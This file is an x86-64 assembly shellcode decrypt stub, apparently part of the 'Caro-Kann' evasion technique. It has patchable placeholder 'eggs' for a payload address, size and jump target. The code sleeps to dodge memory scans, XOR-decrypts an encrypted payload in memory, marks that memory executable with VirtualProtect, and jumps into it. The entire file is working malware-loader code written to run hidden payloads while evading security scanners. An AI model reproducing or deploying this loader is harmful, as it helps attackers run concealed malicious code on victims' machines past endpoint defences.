; Caro-Kann Decrypt Stub - Pure Assembly Version
; This shellcode contains 3 eggs (placeholders) that will be patched:
; Egg 1: Encrypted payload address (0x8888888888888888)
; Egg 2: Payload size (0xDEAD10AF)
; Egg 3: Jump address (0x0000000000000000 in mov r10, addr)

BITS 64
SECTION .text

global DecryptStub

DecryptStub:
    ; Save registers
    push rbp
    mov rbp, rsp
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    ; Egg 1: Load encrypted payload address
    ; Pattern: 0x8888888888888888
    mov r12, 0x8888888888888888  ; payloadAddr (will be patched)

    ; Egg 2: Load payload size
    ; Pattern: 0xDEAD10AF
    mov r13d, 0xDEAD10AF          ; payloadSize (will be patched)

    ; Step 1: Sleep(5000) - avoid immediate memory scan
    sub rsp, 0x28                 ; Shadow space
    mov rcx, 5000                 ; dwMilliseconds = 5000

    ; Get Sleep address from kernel32.dll
    ; For simplicity, we assume Sleep is available in IAT or directly call it
    ; In a real implementation, you would walk PEB and resolve Sleep
    mov rax, Sleep                ; This will be resolved by linker
    call rax

    add rsp, 0x28

    ; Step 2: XOR Decrypt the payload
    ; XOR key: 0x04030201
    mov rdi, r12                  ; data pointer
    mov ecx, r13d                 ; size

    ; Decrypt 4 bytes at a time
    shr ecx, 2                    ; fullBlocks = size / 4
    test ecx, ecx
    jz xor_remaining

xor_loop:
    xor dword [rdi], 0x04030201   ; XOR with key
    add rdi, 4
    dec ecx
    jnz xor_loop

xor_remaining:
    ; Decrypt remaining bytes (if size % 4 != 0)
    mov ecx, r13d
    and ecx, 3                    ; remaining = size % 4
    test ecx, ecx
    jz after_decrypt

xor_remaining_loop:
    xor byte [rdi], 0x01          ; XOR with first byte of key
    inc rdi
    dec ecx
    jnz xor_remaining_loop

after_decrypt:
    ; Step 3: VirtualProtect(payloadAddr, payloadSize, PAGE_EXECUTE_READ, &oldProtect)
    sub rsp, 0x40                 ; Shadow space + locals

    mov rcx, r12                  ; lpAddress = payloadAddr
    mov rdx, r13                  ; dwSize = payloadSize
    mov r8d, 0x20                 ; flNewProtect = PAGE_EXECUTE_READ
    lea r9, [rsp + 0x28]          ; lpflOldProtect = &oldProtect

    mov rax, VirtualProtect       ; Will be resolved by linker
    call rax

    add rsp, 0x40

    ; Step 4: Jump to decrypted payload
    ; Egg 3: Jump trampoline
    ; Pattern: mov r10, 0x0000000000000000; jmp r10
    mov r10, 0x0000000000000000   ; Jump address (will be patched)

    ; Restore registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    pop rbp

    ; Jump to payload
    jmp r10
